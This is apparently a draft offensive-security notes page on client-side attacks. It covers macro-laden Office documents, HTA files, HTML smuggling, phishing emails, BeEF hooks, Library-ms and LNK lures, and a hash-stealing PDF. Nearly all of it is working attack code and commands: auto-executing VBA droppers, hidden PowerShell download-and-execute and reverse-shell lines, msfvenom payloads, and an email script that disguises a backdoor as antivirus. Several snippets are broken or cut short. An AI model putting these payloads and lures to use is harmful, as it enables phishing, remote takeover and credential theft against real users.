---
title: Client-Side Attacks
draft: true
tags:
  - red-team
  - offensive
  - phishing
---
 
# Information Gathering

#### Enumerate metadata and tags from files

- Enumerate PDFs:
```
site:DOMAIN filetype:pdf
```

> [!Note]
> PDFs can also be downloaded from the official website.

- Once downloaded, we can extract the metadata:
```bash
$ exiftool -a -u FILENAME.pdf

Parameters:
-a: display duplicate tags
-u: display unknown tags
```

> [!Note]
> Look for names, creator tools, creation date...

#### Enumerate victim OS and Browser

We'll use [_Canarytokens_](https://canarytokens.com/), a free web service that generates a link with an embedded token that we'll send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system.

---
# Create a fingerprinting web site

- Setup web server (in this case Apache web server):
```sh
$ sudo apt-get install apache2
```

- Start web server
```sh
$ sudo systemctl start apache2
```

- Navigate to the default dir:
```sh
$ cd /var/www/html
```

- Clone fingerprintjs2:
```sh
sudo git clone fingerprintjs2 repo
```

- Navigate in the browser to 127.0.0.1/fingerprintjs2 and view all the info it extracts

- Navigate to the fingerprintjs2 dir and modify the index.html file to not output all the info to hide evidence and also to store the results on a txt file so we can have a log of all systems that navigate to our webpage (fingerprint.js is the script that contains all the logic to fetch the client system info):
```sh
cd fingerprintjs2
vim index.html
```

- Once we get all the system info, we can copy the user agent and navigate to [here](https://explore.whatismybrowser.com/useragents/parse/?analyse-my-user-agent=yes#parse-useragent) to extract the brower being used and the version of the OS.

# Phishing pretexting
https://github.com/L4bF0x/PhishingPretexts

# Resource development and Weaponization
Resource development: preparing the payloads and gathering all info and resources to develop the payloads based on the information gathering fase.
- Focus: adquire the necessary tools, knowledge or resources
- Stage: preceds weaponization. Once the resources are developed, they are weaponized
- Activities: research, reconaissanance, and tool development
- Output: output tools, knowledge and info about the target
- For example: generating a VBA macro

Weaponization: packaging/setup/development/conversion of payload into a package/implant that will be sent to the target.
- Focus: turn the resources into payloads (getting them to send to the target)
- Stage: after resource development. Once the resources are developed, they are weaponized
- Activities: creating and configuring attack payloads, crafting malicious files...
- Output: attack payloads or techniques ready for deployment
- For example: Inserting or embedding the macro into a document
## Visual Basic Application (VBA) Macros
Programming Languaje developed my Microsoft for automating tasks and extending the functionality of Office apps. It can be used to automate processes, interact with Windows API, implement user-defined functions.

Word and Excel allows users to embed VBA macros (programs) in documents/spreadsheets for the automation of manual and repetitive tasks.

Wscript: Windows Script Host object model that provides a scripting environment for executing scripts on Windows-based OS. It can be utilized to extend the capabilities of VBA macros by enabling them to interact with the Windows OS, execute external commands, manipulate files and folders. Its like calling a library or class.

> [!Note]
> Valid extensions: `.docm`, `.dot` and `.dotm`.
> Invalid extensions: `.docx`.

- Hello World:
```vb
Sub HelloWorld()
'
' HelloWorld Macro
'
'

    MsgBox "Hello World!", vbInformation, "Message Box Demo"

End Sub
```

- Execute external program:
```vb
Sub PoC()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("Wscript.shell").Run payload, 0, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle, Wait for completion?
    ' Windowstyle:
    ' 0 -> hides the window and activates another window (run the process in background)
    ' 1 -> activates and displays the window and the window is minimized or maximized the system restores it to its original position
    ' 2 -> activates the window and displays it as minimized window
    ' 3 -> activates the window and displays it as maximized window
End Sub
```

- Execute program (good version) + open when document is opened:
```vb
Sub Document_Open() 'Use Workbook_Open if its an excel file
    PoC ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    PoC ' this subroutine is triggered when the document is opened
End Sub

Sub PoC()
    Dim wsh As Object ' create variable "wsh" that is type Object
    Set wsh = CreateObject("Wscript.shell") ' Set the variable to the function CreateObject
    wsh.Run "notepad.exe", 2, False ' Create a Wscript object to Invoke shell and execute the payload, windowstyle
End Sub
```

> [!Note]
> Both procedures (`Document_Open` and `AutoOpen`) differ slightly, depending on how Microsoft Word and the document were opened. Both cover special cases which the other one doesn't and therefore we use both.

- Read the registry:
```vb
Sub Document_Open()
    RegRead ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    RegRead ' this subroutine is triggered when the document is opened
End Sub

Sub RegRead()
    Dim wsh As Object
    Set wsh = CreateObject("Wscript.shell")
    
    Dim regKey As String
    regKey = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    MsgBox "Product Name: " & wsh.RegRead(regKey & "\ProductName")
End Sub
    
```

Save as **Word Macro-Enabled Document** (.docm) or **Word 97-2003 Document** (.doc -> best option)

## Weaponizing VBA Macros With MSF
Native `vba` msfvenom format is problematic with future versions of Microsoft Office. Use `vba-psh` or `vba-cmd` better.

```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-exe
```
Check output steps:

1. Copy the Macro into the office document macro editor
2. The hex dump must be appended to the end of the document contents (litteraly paste it on the document -> try to masquerade it somehow obviously)
3. Set up a multi/handler and open the document

```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f vba-psh
```

1. Copy the Macro into the office document macro editor
2. Set up a multi/handler and open the document

- Encoded payload:
```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f vba-psh
```

## VBA Powershell Dropper
Dropper: malicious code or payload that dont gain initial access but downloads external payloads that will be used to gain the initial access.

We will create a Word document that downloads a payload with powershell and later executes it:

1. Create the payload:
```sh
$ msfvenom LHOST=LHOST LPORT=LPORT -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe > shell.exe
```

2. Host the payload on a web server
```sh
$ sudo python3 -m http.server LOCAL_PORT
```

3. Create the word document with a macro that downloads the payload and executes it:
```vb
Sub Document_Open()
    dropper ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    dropper ' this subroutine is triggered when the document is opened
End Sub

Sub dropper()
    Dim url As String ' variable that stores remote web server address
    Dim psScript As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST:LOCAL_PORT/shell.exe" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to download and execute the file
    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Temp\file.exe"";" & vbCrLf & _
    "Start-Process -FilePath ""C:\Temp\file.exe"""

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vdHide"
End Sub
```
- `vbCrLf` is used to represent `\n`
- Triple " are used to include a single " in the string
- Setup a multihandler on LHOST and LPORT of the payload and open de document

## VBA reverse shell macro with Powercat
Powercat: powershell version of netcat
Repo: https://github.com/secabstraction/PowerCat

1. Host powercat:
```sh
$ python3 -m http.server LOCAL_PORT
```

3. Setup a listener:
```sh
$ nc -nlvp LOCAL_PORT
```

4. Create the VBA macro that reaches the powerchat
```vb
Sub Document_Open()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub powercat()
    Dim url As String ' variable that stores remote web server address
    Dim psScript As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST:LOCAL_PORT/powercat.ps1" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to download and execute the file
    psScript = "IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c LOCAL_HOST -p LOCAL_PORT -e cmd"

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """, vdHide"
End Sub
```

**Encoded reverse shell**
1. Generate encoded reverse shell on attack machine:
```sh
LHOST=LOCAL_HOST
LPORT=LOCAL_PORT
pwsh -c "iex (New-Object System.Net.WebClient).DownloadString('POWERCAT_PS1_URL'); powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/reverse-shell.exe
```

2. Host the reverse shell:
```sh
$ cd /tmp
$ python3 -m http.server LOCAL_PORT
```

3. Create the macro:
```vb
Sub Document_Open()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    powercat ' this subroutine is triggered when the document is opened
End Sub

Sub powercat()
    Dim Str As String
    Str = "powershell -c ""$code=(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/reverse_shell.txt');IEX 'powershell -E $code'"""
    CreateObject("Wscript.Shell").Run str
```

Here the only difference is that the reverse shell is encoded with powershell encode so powershell knows how to decode it (this will be done in memory) and executed

## Encoded Reverse shell (payload)
This option is recommended to guarantee that the command will be executed correctly and wont fail due to a special character.

1. Encode the payload:
```
$ echo "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell" | base64

SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw
Oi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4y
IC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo=
```

2. Split the base64 encoded string into pieces of 50 characters:
```python
str = "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40OS42Mi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ5LjYyIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbAo="

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

> [!Note]
> Make sure that in the base64 string payload we dont introduce any new lines.

3. Execute the script:
```
$ vim script.py
$ chmod +x script.py 
$ python3 script.py 
Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
Str = Str + "WUgcG93ZXJzaGVsbAo="
```

4. Create the macro:
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SUVYKE5ldy1PYmp"
	Str = Str + "lY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Rya"
	Str = Str + "W5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczE"
	Str = Str + "nKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgL"
	Str = Str + "WUgcG93ZXJzaGVsbAo="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

## Using activeX controls for Macro Execution
ActiveX: technologies developed my Microsoft for creating interactive content within web pages and desktop applications.

It provides a framework for developing reusable software components, known as ActiveX Controls, which can be embedded in web pages, documents... In the case of Office documents, it allows the execution of Macros.

By using ActiveX Controls, we can execute the macros automatically when the document is opened. This is useful to avoid AV detecion of AutoOpen and Document_Open macros

Word -> Developer -> Controls -> Legacy Controls -> More Controls -> Microsoft InkEdit Control
-> View Code

Replace InkEdit1_Change with InkEdit1_GotFocus for automatic execution of the VBA macro:
```vb
Sub InkEdit1_GotFocus()
    ' VBA macro code here
End Sub
```

## Pretexting
Repo: https://github.com/martinsohn/Office-phish-templates

## HTML Applications (HTA)
Apps created using HTML, CSS and JS that run in a special environment using IE.
HTA files have the .hta extension
HTA apps allows the arbitrary execution of programs/code with IE or using mshta.exe (used by IE)

HTA files are executed by mshta.exe, which is the HTML application host. This executable allows HTAs to have more priviledged access to the system than standard web pages. 

HTAs have access to the local filesystem, registry and can execute **ActiveX controls**.

mshta.exe is the HTML Application Host, which is used to execute HTML applications. 

POC:
1. Go to /var/www/html and create a `poc.hta`:
```html
<html>
	<head>
		<script>
			var payload = "calc.exe"
			new ActiveXObject('Wscript.Shell').Run(payload);
		<script>
	</head>
	<body>
		<h1> HTA POC </h1>
		<script>
			self.close(); // to avoid the window with the html to open
		</script>
	</body>
</html>
```

2. Start the web server:
```sh
sudo systemctl start apache2
```

3. Navigate to `LOCAL_IP/poc.hta` and accept all:

The HTA file will be executed with mshta.exe outside of the browser sandbox so we will get the privileges of the current user. 

## HTA Attacks

1. Go to the apache dir:
```sh
$ cd /var/www/html/
```

2. Create a payload:
```sh
$ msfvenom LHOST=LOCAL_IP LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f hta-psh -o shell.hta
```

3. Setup a listener:
```
nc -nlvp LOCAL_PORT
```

4. Navigate to `http://LOCAL_HOST/shell.hta` and open the file

Another option is to create a Word document with a macro that executes the HTA application (follow above steps to host the HTA file):
```vb
Sub Document_Open()
    ExecuteHTA ' this subroutine is triggered when the document is opened
End Sub

Sub AutoOpen()
    ExecuteHTA ' this subroutine is triggered when the document is opened
End Sub

Sub ExecuteHTA()
    Dim url As String ' variable that stores remote web server address
    Dim command As String ' variable that stores PowerShell script/command to execute
    
    url = "http://LOCAL_HOST/shell.hta" ' URL of the remote web server hosting the payload for initial access

	' PowerShell script to execute the HTA app
    command = "mshta.exe " & url

	' Execute the PowerShell script using Shell and hides the window for extra stealth'
    Shell command, vbNormalFocus
End Sub
```

## Automating Macro development with MacroPack

Help
```powershell
PSH> .\macro_pack.exe --help
```

List formats:
```powershell
PSH> .\macro_pack.exe --listformats
```

Arbitrary Command Execution:
```powershell
PSH> echo "calc.exe" | .\macro_pack.exe -t CMD -o -G "test.doc"
Parameters: 
-t: specifies the type of payload/template being used, in this case the template type is **CMD**.
-o: This enables VBA code obfuscation.
-G: This specifies the name and type of the output file, in this case the output file is "test.doc".
"calc.exe": it can be a command ("cat") or an executable and is going to be executed by the payload type
```

List templates (payload type: dropper, cmd, ...):
```powershell
PSH> .\macro_pack.exe --listtemplates
```

Generate meterpreter reverse shell payload and inject it:
```powershell
PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT | .\macro_pack.exe -o -G "resume.doc"

PSH> msfconsole.bat
msf> use multi/handler
msf> set options..
msf > run

PSH> python -m http.server 8080

*Go to the target machine and download and run the document*
```

Dropper:
```powershell
1. Create the payload we are going to host
PSH> msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f exe -o update.exe

2. Create the malicious document that will download and execute the payload we are hosting
PSH> echo "http://LOCAL_HOST:HTTP_LOCAL_PORT/update.exe" "update.exe" | .\macro_pack.exe -t DROPPER -o -G "Accounts2025.xls"

3. Setup a listener for the payload when executed
PSH> msfconsole.bat
msf> use multi/handler
msf> set options..
msf > run

4. Setup a server for downloading the payload
PSH> python -m http.server HTTP_LOCAL_PORT

*Go to the target machine and download and run the document*
```

## Macro reverse shell

1. Open libreoffice:
```bash
$ libreoffice
```

2. Create the macro: Go to Tools -> Macros -> Organize Macros -> Basic -> New (create a new one over the document we are using)
```vb
Sub Main
	Shell("cmd /c certutil -urlcache -split -f http://192.168.45.215/shell.exe C:\Windows\Temp\shell.exe")
	Shell("cmd /c C:\Windows\Temp\shell.exe")
End Sub
```

3. Insert the macro in the document: Go to Tools -> Customize -> Events -> Open Document and select the


## File smuggling with HTML and JavaScript
Delivery: attacker delivers the payload or malicious document to the target. 
HTTP Smuggling: delivery method to deliver hidden payloads through emails or websites. 
Configure a website to smuggle the payload and bypass the client side filter. Configure the web page to save the payload into the target system.

- Create a malicious html website hosted on our attack machine that will contain a malicious payload:

1. Generate the payload:
```sh
$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
```

2. Convert the payload into base64:
```sh
$ base64 -w0 backdoor.exe > base64.txt
```

3. Naviagte to the Apache default directory and create the index.html file:
```sh
$ cd /var/www/html
$ vim index.html
```

4. Insert the contents of the HTML web page with the JS so that when the victim loads the webpage it will download the payload. Inject the encoded payload into the `file` variable:
```html
<html> 
	<body> 
		<script> 
			function base64ToArrayBuffer(base64) { 
				var binary_string = window.atob(base64); 
				var len = binary_string.length; 
				var bytes = new Uint8Array( len ); 
				for (var i = 0; i < len; i++) { 
					bytes[i] = binary_string.charCodeAt(i); 
				} 
				return bytes.buffer; 
			}
			var file ='<backdoor.exe Base64 Encoded Value>'; 
			var data = base64ToArrayBuffer(file); 
			var blob = new Blob([data], {type: 'octet/stream'}); 
			var fileName = 'msfstaged.exe'; 
			var a = document.createElement('a'); document.body.appendChild(a); a.style = 'display: none'; 
			var url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); window.URL.revokeObjectURL(url); 
		</script> 
	</body> 
</html>
```

5. Start the apache service:
```sh
$ service apache2 start
```

6. Setup a handler for receiving the connection:
```sh
msf> use multi/handler
msf> set options...
```

## Initial access via Spear Phishing Attachment
1. Create the malicious payload:
```sh
$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
```

2. Create the python script that will use SMTP to send the malicious email (we can compromise a company SMTP server to send the email):
```sh
$ vim email_send.py
```

```python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
fromaddr = "attacker@fake.net"
toaddr = "bob@ine.local"  
# instance of MIMEMultipart
msg = MIMEMultipart()
# storing the senders email address  
msg['From'] = fromaddr
# storing the receivers email address 
msg['To'] = toaddr
# storing the subject 
msg['Subject'] = "Subject of the Mail"
# string to store the body of the mail
body = "Body_of_the_mail"
# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))
# open the file to be sent 
filename = "Free_AntiVirus.exe"
attachment = open("/root/backdoor.exe", "rb")
# instance of MIMEBase and named as p
p = MIMEBase('application', 'octet-stream')
# To change the payload into encoded form
p.set_payload((attachment).read())
# encode into base64
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
# attach the instance 'p' to instance 'msg'
msg.attach(p)
# creates SMTP session
s = smtplib.SMTP('demo.ine.local', 25)
# Converts the Multipart msg into a string
text = msg.as_string()
# sending the mail
s.sendmail(fromaddr, toaddr, text)
# terminating the session
s.quit()
```

3. Set the listener to receive the connection:
```sh
$ msfconsole
msf> use multi/handler
msf> set LHOST LOCAL_HOST
msf> set LPORT LOCAL_PORT
msf> run
```

4. Send the email:
```sh
python3 email_send.py
```

## Establishing a shell through victims web browser
Tool Browser explorer exploitation framework (BEEF)
We are going to host a phishing website that will be sent to the victim through a link. 
Prerequisite: gather info about the victim browser

Start beef:
```sh
$ sudo beef-xss
```

Navigate to `127.0.0.1:3000/ui/panel` and login to beef with `beef:password`

Create a malicious website and inject the BEEF hook to hook all the victims that search the website:
```html
<html>
	<head>
		<script src="http://LOCAL_IP:3000/hook.js"></script>
	</head>
	<body>
		<h1>Please update your browser to access the website</h1>
	</body>
</html>
```

Start the apache service:
```sh
$ service apache2 start
```

Create the payload and setup a multi/handler listening for the payload to be executed:
```sh
$ msfvenom LHOST=LOCAL_HOST LPORT=LOCAL_PORT -p windows/meterpreter/reverse_tcp -f exe > backdoor.exe
```

Host the payload with a server:
```sh
$ python3 -m http.server 8080
```

On beef interface, go to commands section and select the fake notification bar. Set the plugin URL to the payload that we are hosting, and set the message.

## Windows Library Files (Phishing)

Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations. The parts are _General library information_, _Library properties_, and _Library locations_.

1. Create the Windows Library File (from a Windows host):

Open VS Code and just save a blank file called `config.Library-ms` on the Desktop.

> [!Note]
> Library files have the extension `.Library-ms`, for example `config.Library-ms`

2. Open the previous file again and add the following code:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://LOCAL_HOST</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

> [!Note]
> Change the `url` tag to the WebDAV server host.

3. Create a `.LNK` called `automatic_configuration.lnk` with the following contents to execute the reverse shell:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://LOCAL_HOST:LOCAL_PORT/powercat.ps1'); powercat -c LOCAL_HOST -p LISTENER_PORT -e powershell"
```

4. Copy the `.LNK` and the `.Library-ms` to the WebDAV server:
```bash
$ smbclient //LOCAL_HOST/share -c 'put config.Library-ms'
```

> [!Note]
> This step involves uploading the files to the kali attack machine where the webdav server is going to be hosted. We can use SMB shares better.

5. Start the listeners and http server:
```bash
$ python3 -m http.server LOCAL_PORT
$ nc -nvlp LISTENER_PORT
```

6. Setup a WebDAV server on our attack host:

> [!Important]
> Dont setup the server and wait until the `config.Library-ms` and the `.LNK` are in the webdav folder to avoid changing the config metadata.

```bash
$ pip3 install wsgidav # install the webdav server packages
or
$ sudo apt install python3-wsgidav


$ mkdir /home/kali/webdav # create the directory where we are going to host the .lnk to the payload

$ touch /home/kali/webdav/test.txt # create a placeholder

$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/ # initiate the WebDAV server

Parameters:
--host=<IP>: host where we are serving the webdav
--port=<PORT>: port where we are serving the webdav
--auth=<TYPE>: auth type
--root=<DIR>: root dir of the webdav share
```

7. Send a phishing email to the target with the `config.Library-ms`:
```bash
$ sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data

Example:
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

or

$ sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.138.140 --body "Please check this spreadsheet" --header "Subject: Please check this spreadsheet"
```

> [!Note]
> Put `@` before the attachments to attach the files. If not, a string will be send.

# Create ODT/ODS format payloads (automated)

Clone the following repo:
```bash
git clone https://github.com/0bfxgh0st/MMG-LO/
```

Usage:
```bash
python3 mmg-ods.py [windows|linux] LOCAL_IP LOCAL_PORT

[windows|linux] = target OS
```

Setup a listener:
```bash
nc -nvlp LOCAL_PORT
```

Send email:
```bash
sudo swaks [ -t DESTINATION_EMAIL -t DESTINATION_EMAIL ...] --from SOURCE_EMAIL -ap --attach @config.Library-ms --server <victim-ip> --body @body.txt --header "Subject: Urgent Configuration Setup" --suppress-data
```

# File Upload Phishing

If we identify in a web server a file upload functionality that we know a user behind will open the uploaded file (for example a CV for a job application), we can setup a responder and upload a file referencing our IP to extract the user hash.

1. Setup responder:
```
$ sudo responder -I INTERFACE
```

2. Craft the malicious phishing payload:

**PDF**
```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /XObject << /Im0 5 0 R >> >> >>
endobj

4 0 obj
<< /Length 44 >>
stream
q
100 0 0 100 100 600 cm
/Im0 Do
Q
endstream
endobj

5 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 1
/Height 1
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/Filter /DCTDecode
/Length 0
/F (\\\\ATTACKER_IP\\share\\test.jpg)
>>
stream
endstream
endobj

xref
0 6
0000000000 65535 f
trailer
<< /Size 6 /Root 1 0 R >>
startxref
%%EOF

```